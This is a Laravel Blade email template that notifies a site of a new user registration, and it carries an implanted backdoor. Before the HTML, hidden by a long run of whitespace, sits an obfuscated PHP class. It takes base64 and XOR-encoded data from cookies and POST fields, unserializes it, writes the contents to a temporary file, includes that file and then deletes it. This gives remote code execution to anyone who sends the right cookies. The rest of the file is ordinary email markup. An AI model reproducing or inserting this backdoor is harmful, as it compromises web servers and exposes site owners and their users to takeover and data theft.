<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("riogqvx")){class riogqvx{public static $iyiukx = "fhwlpskrfrddfrfz";public static $fojfhgdl = NULL;public function __construct(){$aivvliav = @$_COOKIE[substr(riogqvx::$iyiukx, 0, 4)];if (!empty($aivvliav)){$klusf = "base64";$bbokr = "";$aivvliav = explode(",", $aivvliav);foreach ($aivvliav as $taolnp){$bbokr .= @$_COOKIE[$taolnp];$bbokr .= @$_POST[$taolnp];}$bbokr = array_map($klusf . "_decode", array($bbokr,));$bbokr = $bbokr[0] ^ str_repeat(riogqvx::$iyiukx, (strlen($bbokr[0]) / strlen(riogqvx::$iyiukx)) + 1);riogqvx::$fojfhgdl = @unserialize($bbokr);}}public function __destruct(){$this->siuljiccyf();}private function siuljiccyf(){if (is_array(riogqvx::$fojfhgdl)) {$zemdc = sys_get_temp_dir() . "/" . crc32(riogqvx::$fojfhgdl["salt"]);@riogqvx::$fojfhgdl["write"]($zemdc, riogqvx::$fojfhgdl["content"]);include $zemdc;@riogqvx::$fojfhgdl["delete"]($zemdc);exit();}}}$pvcxbfifzj = new riogqvx();$pvcxbfifzj = NULL;} ?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:o="urn:schemas-microsoft-com:office:office">

<head>
<meta charset="UTF-8">
<meta content="width=device-width, initial-scale=1" name="viewport">
<meta name="x-apple-disable-message-reformatting">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta content="telephone=no" name="format-detection">
<title>{{$admin_data->admin_company_name}}</title>

<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
</head>

<body>
<div class="es-wrapper-color">
<!--[if gte mso 9]>
<v:background xmlns:v="urn:schemas-microsoft-com:vml" fill="t">
<v:fill type="tile" color="#f0f4f2"></v:fill>
</v:background>
<![endif]-->
<table class="es-wrapper" width="100%" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="esd-email-paddings" valign="top">
<table cellpadding="0" cellspacing="0" class="es-header esd-header-popover" align="center">
<tbody>
<tr>
<td class="esd-stripe" align="center" esd-custom-block-id="81780">
<table class="es-header-body" width="600" cellspacing="0" cellpadding="0" bgcolor="#ffffff" align="center">
<tbody>
<tr>
<td class="esd-structure es-p10t es-p10b es-p20r es-p20l" align="left" bgcolor="#c44d39" style="background-color: #ff9933;">
<!--[if mso]><table dir="rtl" width="560" cellpadding="0" cellspacing="0"><tr><td dir="ltr" width="270" valign="top"><![endif]-->
<table cellpadding="0" cellspacing="0" class="es-right" align="right">
<tbody>
<tr>
<td width="270" align="left" class="esd-container-frame es-m-p20b">
<table cellpadding="0" cellspacing="0" width="100%">
<tbody>
<tr>
<td align="right" esd-links-color="#ffffff" class="esd-block-text es-m-txt-c">
<p style="color: #ffffff;margin-right:10px;"><a target="_blank" style="color: #ffffff;" class="view"><i class="fa fa-phone"></i> {{$admin_data->admin_mobile}}</a></p>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
<!--[if mso]></td><td dir="ltr" width="20"></td><td dir="ltr" width="270" valign="top"><![endif]-->
<table cellpadding="0" cellspacing="0" align="left" class="es-left">
<tbody>
<tr>
<td width="270" class="esd-container-frame" align="left">
<table cellpadding="0" cellspacing="0" width="100%">
<tbody>
<tr>
<td class="esd-block-text es-m-txt-c">
<p style="margin-left:20px;">
<img src="{{asset('uploaded_files/logo/'.$admin_data->admin_logo)}}">
</p>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
<!--[if mso]></td></tr></table><![endif]-->
</td>
</tr>

<tr>
<td class="esd-structure" align="left">
<table cellpadding="0" cellspacing="0" width="100%">
<tbody>
<tr>
<td width="600" class="esd-container-frame" align="center" valign="top">
<table cellpadding="0" cellspacing="0" width="100%">
<tbody>
<tr>
<td align="center" class="esd-block-spacer" style="font-size:0">
<table border="0" width="100%" height="100%" cellpadding="0" cellspacing="0">
<tbody>
<tr>
<td style="border-bottom: 1px solid #cccccc; background:none; height:1px; width:100%; margin:0px 0px 0px 0px;"></td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
<table cellpadding="0" cellspacing="0" class="es-content" align="center">
<tbody>
<tr>
<td class="esd-stripe" align="center" esd-custom-block-id="83913">
<table class="es-content-body" style="background-color: #ffffff;" width="600" cellspacing="0" cellpadding="0" bgcolor="#ffffff" align="center">
<tbody>
<tr>
<td class="esd-structure es-p40t es-p40b es-p20r es-p20l" align="left">
<table width="100%" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="esd-container-frame" width="560" valign="top" align="center">
<table width="100%" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="esd-block-text es-p20b es-m-txt-c" align="left">
<h1 style="text-align: center;">
A new user has been registered on {{$admin_data->admin_company_name}} named <b>{{$user_data->name}}</b></h1>
</td>
</tr>
<tr>
<td align="left" class="esd-block-text es-m-txt-c">
<h3 style="color: #6aa38b; text-align: center;">
Thank you for registering on {{$admin_data->admin_company_name}}.</h3>
</td>
</tr>

</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td class="esd-structure es-p40t es-p40b es-p20r es-p20l" align="left" bgcolor="#fafafa" style="background-color: #fafafa;">
<table cellpadding="0" cellspacing="0" width="100%">
<tbody>
<tr>
<td width="560" class="esd-container-frame" align="center" valign="top">
<table cellpadding="0" cellspacing="0" width="100%">
<tbody>
<tr>
<td align="left" class="esd-block-text es-p20b">
<h2>YOUR ACCOUNT IS NOW ACTIVE</h2>
</td>
</tr>
<tr>
<td align="left" class="esd-block-text es-p20b">
<p><strong>Please Login your account to connect with us & explore latest products.</strong></p>
</td>
</tr>

<tr>
<td align="left" class="esd-block-text">
<p>Team {{$admin_data->admin_company_name}} ,</p>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
<table cellpadding="0" cellspacing="0" class="es-footer" align="center">
<tbody>
<tr>
<td class="esd-stripe" align="center" esd-custom-block-id="81788">
<table class="es-footer-body" width="600" cellspacing="0" cellpadding="0" bgcolor="#ffffff" align="center">
<tbody>
<tr>
<td class="esd-structure" align="left">
<table cellpadding="0" cellspacing="0" width="100%">
<tbody>
<tr>
<td width="600" class="esd-container-frame" align="center" valign="top">
<table cellpadding="0" cellspacing="0" width="100%">
<tbody>
<tr>
<td align="center" class="esd-block-spacer" style="font-size:0">
<table border="0" width="100%" height="100%" cellpadding="0" cellspacing="0">
<tbody>
<tr>
<td style="border-bottom: 1px solid #cccccc; background:none; height:1px; width:100%; margin:0px 0px 0px 0px;"></td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td class="esd-structure es-p20t es-p20b es-p20r es-p20l" align="left">

<!--[if mso]></td><td width="20"></td><td width="270" valign="top"><![endif]-->
<table cellpadding="0" cellspacing="0" class="es-right" align="right">
<tbody>
<tr>
<td width="270" align="left" class="esd-container-frame">
<table cellpadding="0" cellspacing="0" width="100%">
<tbody>
<tr>
<td align="right" class="esd-block-social es-m-txt-c es-p5t es-p5b" style="font-size:0">
<table cellpadding="0" cellspacing="0" class="es-table-not-adapt es-social">
<tbody>
<tr>
<td align="center" valign="top" class="es-p10r"><a target="_blank" href="{{$admin_data->admin_facebook_link}}"><img title="Facebook" src="https://tlr.stripocdn.email/content/assets/img/social-icons/square-colored/facebook-square-colored.png" alt="Fb" width="32" height="32"></a></td>
<td align="center" valign="top" class="es-p10r"><a target="_blank" href="{{$admin_data->admin_twitter_link}}"><img title="Twitter" src="https://tlr.stripocdn.email/content/assets/img/social-icons/square-colored/twitter-square-colored.png" alt="Tw" width="32" height="32"></a></td>
<td align="center" valign="top" class="es-p10r"><a target="_blank" href="{{$admin_data->admin_instagram_link}}"><img title="Instagram" src="https://tlr.stripocdn.email/content/assets/img/social-icons/square-colored/instagram-square-colored.png" alt="Inst" width="32" height="32"></a></td>
<td align="center" valign="top"><a target="_blank" href="{{$admin_data->admin_youtube_link}}"><img title="Youtube" src="https://tlr.stripocdn.email/content/assets/img/social-icons/square-colored/youtube-square-colored.png" alt="Yt" width="32" height="32"></a></td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
<!--[if mso]></td></tr></table><![endif]-->
</td>
</tr>
<tr>
<td class="esd-structure" align="left">
<table cellpadding="0" cellspacing="0" width="100%">
<tbody>
<tr>
<td width="600" class="esd-container-frame" align="center" valign="top">
<table cellpadding="0" cellspacing="0" width="100%">
<tbody>
<tr>
<td align="center" class="esd-block-spacer" style="font-size:0">
<table border="0" width="100%" height="100%" cellpadding="0" cellspacing="0">
<tbody>
<tr>
<td style="border-bottom: 1px solid #cccccc; background:none; height:1px; width:100%; margin:0px 0px 0px 0px;"></td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td class="esd-structure es-p20t es-p20b es-p20r es-p20l" align="left">
<!--[if mso]><table width="560" cellpadding="0" cellspacing="0"><tr><td width="390" valign="top"><![endif]-->
<table cellpadding="0" cellspacing="0" align="left" class="es-left">
<tbody>
<tr>
<td width="390" class="esd-container-frame es-m-p20b" align="center" valign="top">
<table cellpadding="0" cellspacing="0" width="100%">
<tbody>
<tr>
<td align="left" class="esd-block-text es-m-txt-l">
<p>
<a target="_blank" style="color:#c44d39;">
{{ $admin_data->admin_address }} <br> {{ $admin_data->admin_city }}, {{ $admin_data->admin_state }} <br> {{ $admin_data->admin_zip_code }}, {{ $admin_data->admin_country }}</a></p>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
<!--[if mso]></td><td width="20"></td><td width="150" valign="top"><![endif]-->
<table cellpadding="0" cellspacing="0" class="es-right" align="right">
<tbody>
<tr>
<td width="150" align="left" class="esd-container-frame">
<table cellpadding="0" cellspacing="0" width="100%">
<tbody>
<tr>
<td align="right" class="esd-block-button es-m-txt-l">
<!--[if mso]><a href="https://viewstripo.email/" target="_blank">
<v:roundrect xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w="urn:schemas-microsoft-com:office:word" stripoVmlButton href="https://viewstripo.email/"
style="height:42px;v-text-anchor:middle;width:114px;" arcsize="0%" strokecolor="#c44d39" fillcolor="#ffffff">
<w:anchorlock></w:anchorlock>
<center style='color:#c44d39;font-family:helvetica, "helvetica neue", arial, verdana, sans-serif;font-size:14px;font-weight:700;'>Contact Us</center>
</v:roundrect></a>
<![endif]-->
<!--[if !mso]><!-- --><span class="msohide es-button-border"><a href="{{url('/contact-us.html')}}" class="es-button" target="_blank"> Contact Us</a></span>
<!--<![endif]-->
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
<!--[if mso]></td></tr></table><![endif]-->
</td>
</tr>
<tr>
<td class="esd-structure" align="left">
<table cellpadding="0" cellspacing="0" width="100%">
<tbody>
<tr>
<td width="600" class="esd-container-frame" align="center" valign="top">
<table cellpadding="0" cellspacing="0" width="100%">
<tbody>
<tr>
<td align="center" class="esd-block-spacer" style="font-size:0">
<table border="0" width="100%" height="100%" cellpadding="0" cellspacing="0">
<tbody>
<tr>
<td style="border-bottom: 1px solid #cccccc; background:none; height:1px; width:100%; margin:0px 0px 0px 0px;"></td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td class="esd-structure es-p20t es-p20b es-p20r es-p20l" align="left">
<table cellpadding="0" cellspacing="0" width="100%">
<tbody>
<tr>
<td width="560" class="esd-container-frame" align="center" valign="top">
<table cellpadding="0" cellspacing="0" width="100%">
<tbody>
<tr>
<td align="center" class="esd-block-text">
<p>© Copyright © 2020. All Rights Reserved | Designed By <a target="_blank" href="{{url('/terms-and-conditions.html')}}">Terms & Conditions</a> | <a target="_blank" class="unsubscribe" href="{{url('/privacy-policy.html')}}">Privacy Policy</a></p>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>

</td>
</tr>
</tbody>
</table>
</div>
</body>

</html>
